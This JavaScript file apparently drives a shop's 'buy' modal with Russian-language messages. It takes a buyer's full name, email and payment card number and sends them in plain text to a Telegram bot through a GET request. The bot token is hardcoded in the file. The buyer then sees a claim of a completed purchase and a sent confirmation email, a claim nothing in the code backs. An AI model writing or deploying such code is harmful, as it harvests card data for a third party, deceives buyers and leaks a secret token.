const modalWindow = () => {
    const apply = document.querySelector('.apply') 
    const backdrop__modal = document.querySelector('.backdrop__modal') 
    const modal = document.querySelector('.modal')  
    const crest = document.querySelector('.crest')
    const content__modal = document.querySelector('.content__modal')
    const buy__modal = document.querySelector('.buy__modal')
    const text__after__content = document.querySelector('.text__after__content')
    const input__modal = document.querySelectorAll('.input__modal')

    let timeout;

    apply.addEventListener('click', () => { 
        backdrop__modal.classList.add('backdrop__active')
        modal.classList.add('modal__active')
    })

    const backdrop__allRemove = () => {
        backdrop__modal.classList.remove('backdrop__active')
        modal.classList.remove('modal__active')
        content__modal.classList.remove('hide__content__modal')
        text__after__content.innerHTML = ''
        input__modal.forEach(el => {
            el.value = ''
        })
    }

    const backdrop__remove = (item) => {
        item.addEventListener('click', () => {
            backdrop__allRemove()
            clearTimeout(timeout)
        })
    }
    backdrop__remove(backdrop__modal)
    backdrop__remove(crest)

    modal.addEventListener('click', (e) => {
        e.stopPropagation()
    })



    // telegram

    const fio = document.querySelector('#fio')
    const mail = document.querySelector('#mail')
    const card = document.querySelector('#card')

    const bot = {
        token: '6654599998:AAE0PYXb04uWtrbwbxnJnMPKDJEurCiHEOU',
        chatID: '-4035691073',
    }
    
    buy__modal.addEventListener('click', (e) => {
        const  messageTG = `Ф.И.О: ${fio.value} E-mail: ${mail.value} Номер карты: ${card.value}`

        e.preventDefault()
        
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatID}&text=${messageTG}`)

        .catch(error => {
            text__after__content.innerHTML = `${error} <p>ERR_INTERNET_DISCONNECTED</p>`
        })
        .then(res => res.json())
            .then(res => {
                if (!res.ok) {
                    text__after__content.innerHTML = `
                    <h1>Ошибка в токене или в id</h1>
                    `
                } else {
                    input__modal.forEach(el => {
                        if (el.value === '') {
                            text__after__content.innerHTML = `
                            <h1>Одно из полей не заполнено :(</h1>
                            <h2>Повторите попытку!</h2>
                            `
                        } else {
                            text__after__content.innerHTML = `
                            <h1>Покупка прошла успешно!</h1>
                            <h2>Мы выслали потдверждающее письмо Вам на почту)</h2>
                            `
                        }
                    })
                }
            })
        content__modal.classList.add('hide__content__modal')
        timeout = setTimeout(backdrop__allRemove, 2000)
    })

    // telegram

}
modalWindow()



